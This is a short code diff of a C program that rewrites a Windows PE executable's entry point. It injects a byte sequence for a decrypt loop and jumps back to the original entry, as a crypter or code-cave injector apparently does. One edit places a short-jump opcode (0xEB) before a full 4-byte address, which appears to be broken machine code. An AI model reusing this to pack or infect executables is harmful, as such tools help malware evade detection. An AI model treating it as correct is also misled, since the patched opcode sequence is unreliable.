@@ -184,7 +184,7 @@ int main(int argc, char** argv) {
 	DWORD offsetEntryPointEndCode = terminateS - bytesLivre - ids->addressCru + (ids->addressV+32); 
 	DWORD offsetSecionDados = inh->OptionalHeader.ImageBase + idd->addressV;
 	DWORD terminateDd = inh->OptionalHeader.ImageBase+idd->addressV  + idd->tamCru;
-	DWORD loopOffsetEnc = offsetEntryPointEndCode + 5;
+	DWORD loopOffsetEnc = offsetEntryPointEndCode + 17;
 	DWORD entryPointV = inh->OptionalHeader.ImageBase+offsetEntryPointEndCode;
 	DWORD entryPointOriginal = inh->OptionalHeader.ImageBase + inh->OptionalHeader.AddressOfEntryPoint;
 	
@@ -271,13 +271,21 @@ int main(int argc, char** argv) {
 						buffer[p+16] = loopOffsetEnc2[1];
 						buffer[p+17] = loopOffsetEnc2[3];
 									
-						buffer[p+18] = 0x68;
+						buffer[p+18] = 0xEB;
 						
 						buffer[p+19] = entryPointOriginal2[0];
 						buffer[p+20] = entryPointOriginal2[1];
 						buffer[p+21] = entryPointOriginal2[2];
 						buffer[p+22] = entryPointOriginal2[3];
-						offset++;			
+						offset++;
+						/*
+						if( p == r2 - 2){
+						printf("\nachou %X",offsety);
+							break;
+						
+					}
+					break;
+					*/
 				}
 			}
 		}
